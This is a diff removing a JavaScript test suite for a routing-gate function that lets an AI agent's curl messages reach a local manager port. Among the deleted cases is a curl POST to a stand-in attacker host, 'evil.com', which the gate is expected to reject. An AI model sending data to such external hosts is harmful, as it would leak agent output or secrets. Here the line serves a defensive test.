@@ -27,7 +27,6 @@ const {
   buildAutoPickupContext
 } = require('../scripts/hooks/core/task-completed');
 
-const { isDiagnosticCurlBypass } = require('../scripts/hooks/core/routing-gate');
 
 // ============================================================
 // Gap A — isChannelDispatched
@@ -132,105 +131,6 @@ describe('buildAutoPickupContext', () => {
               ctx.toLowerCase().includes('hedging') ||
               ctx.toLowerCase().includes('forbidden'),
       'directive must enumerate the forbidden patterns');
-  });
-});
-
-// ============================================================
-// Gap D — isDiagnosticCurlBypass
-// ============================================================
-
-describe('isDiagnosticCurlBypass', () => {
-  const cfg = { workspace: { diagnosticCurlBypass: true } };
-
-  it('allows curl to localhost:8800 with "## ANSWER:" marker', () => {
-    const cmd = `curl -s -X POST http://localhost:8800 -H "X-Wogi-From: backend" -d "## ANSWER: the thing is done"`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), true);
-  });
-
-  it('allows curl to 127.0.0.1:8800 with "## QUESTION:" marker', () => {
-    const cmd = `curl -s -X POST http://127.0.0.1:8800 -H "Content-Type: text/plain" -d "## QUESTION: what should I do?"`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), true);
-  });
-
-  it('allows curl with "## DIAGNOSTIC:" marker', () => {
-    const cmd = `curl -X POST http://127.0.0.1:8800 -d "## DIAGNOSTIC: here is my state"`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), true);
-  });
-
-  it('allows curl with "## INTROSPECTION" (substring match)', () => {
-    const cmd = `curl -X POST http://localhost:8800 -d "## Report for INTROSPECTION request"`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), true);
-  });
-
-  it('REJECTS curl to a non-manager port', () => {
-    const cmd = `curl -X POST http://localhost:8801 -d "## ANSWER: hi"`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), false);
-  });
-
-  it('REJECTS curl to external URL (not localhost)', () => {
-    const cmd = `curl -X POST http://evil.com:8800 -d "## ANSWER: hi"`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), false);
-  });
-
-  it('REJECTS curl with body that does NOT start with "## "', () => {
-    const cmd = `curl -X POST http://localhost:8800 -d "regular message with ## ANSWER later"`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), false);
-  });
-
-  it('REJECTS curl with "## " but no diagnostic marker', () => {
-    const cmd = `curl -X POST http://localhost:8800 -d "## Hello: just saying hi"`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), false);
-  });
-
-  it('REJECTS curl reading from stdin (@-)', () => {
-    // Stdin bodies can't be inspected — conservatively rejected.
-    const cmd = `curl -X POST http://localhost:8800 --data-binary @-`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), false);
-  });
-
-  it('REJECTS curl reading from a file (@filename)', () => {
-    const cmd = `curl -X POST http://localhost:8800 --data @payload.txt`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), false);
-  });
-
-  it('REJECTS non-Bash commands / missing curl', () => {
-    assert.equal(isDiagnosticCurlBypass({ command: 'echo hi' }, cfg), false);
-    assert.equal(isDiagnosticCurlBypass({ command: '' }, cfg), false);
-    assert.equal(isDiagnosticCurlBypass({}, cfg), false);
-    assert.equal(isDiagnosticCurlBypass(null, cfg), false);
-  });
-
-  it('REJECTS when config.workspace.diagnosticCurlBypass is false', () => {
-    const cmd = `curl -X POST http://localhost:8800 -d "## ANSWER: hi"`;
-    assert.equal(isDiagnosticCurlBypass({ command: cmd }, { workspace: { diagnosticCurlBypass: false } }), false);
-  });
-
-  it('respects WOGI_MANAGER_PORT env var override', () => {
-    const orig = process.env.WOGI_MANAGER_PORT;
-    process.env.WOGI_MANAGER_PORT = '9999';
-    try {
-      const cmd = `curl -X POST http://localhost:9999 -d "## ANSWER: hi"`;
-      assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), true);
-      const wrongPort = `curl -X POST http://localhost:8800 -d "## ANSWER: hi"`;
-      assert.equal(isDiagnosticCurlBypass({ command: wrongPort }, cfg), false,
-        'custom port override should now reject 8800');
-    } finally {
-      if (orig === undefined) delete process.env.WOGI_MANAGER_PORT;
-      else process.env.WOGI_MANAGER_PORT = orig;
-    }
-  });
-
-  it('ignores manager port that is not a valid 2-5 digit number (regex-injection guard)', () => {
-    const orig = process.env.WOGI_MANAGER_PORT;
-    process.env.WOGI_MANAGER_PORT = 'abc123';
-    try {
-      const cmd = `curl -X POST http://localhost:8800 -d "## ANSWER: hi"`;
-      assert.equal(isDiagnosticCurlBypass({ command: cmd }, cfg), false,
-        'invalid port should fail closed, not open a hole');
-    } finally {
-      if (orig === undefined) delete process.env.WOGI_MANAGER_PORT;
-      else process.env.WOGI_MANAGER_PORT = orig;
-    }
   });
 });
 
